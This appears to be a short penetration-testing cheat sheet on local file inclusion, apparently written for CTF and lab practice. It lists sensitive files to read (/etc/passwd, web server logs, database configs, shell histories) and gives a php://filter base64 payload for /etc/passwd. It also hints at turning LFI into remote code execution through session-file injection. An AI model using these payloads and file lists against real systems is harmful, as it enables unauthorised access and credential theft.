# LFI

usually happens when you have dynamic content based on a parameter

{% hint style="info" %}
think about where and how you could write files to disk which can give you RCE

* session file
* there is almost always other services / features on the box to help with file write on disk
* RFI
{% endhint %}

## common files

```
/etc/knockd.conf
/etc/default/knockd
/etc/issue
/etc/motd
/etc/group
/etc/passwd
/var/www/html/.htaccess
/etc/httpd/logs/acces_log
/etc/httpd/logs/error_log
/var/www/logs/access_log
/var/www/logs/access.log
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/var/log/apache/access_log
/var/log/apache2/access_log
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/access_log
/var/www/html/db.php
/var/www/html/db/db.php
/var/www/html/config.php
```

## user home directory and root

```
bash_history
.mysql_history
.my.cnf
.profile
```

## configuration files

`find / -type f 2>/dev/null | grep -i conf` db/db.php db.php session.php config.php mysql.conf

## common things during LFI

?page=php://filter/convert.base64-encode/resource=/etc/passwd User-Agent: Mozilla/5.0 like Gecko



LFI + php session file injection => RCE => [https://0xdf.gitlab.io/2020/03/28/htb-sniper.html](https://0xdf.gitlab.io/2020/03/28/htb-sniper.html)
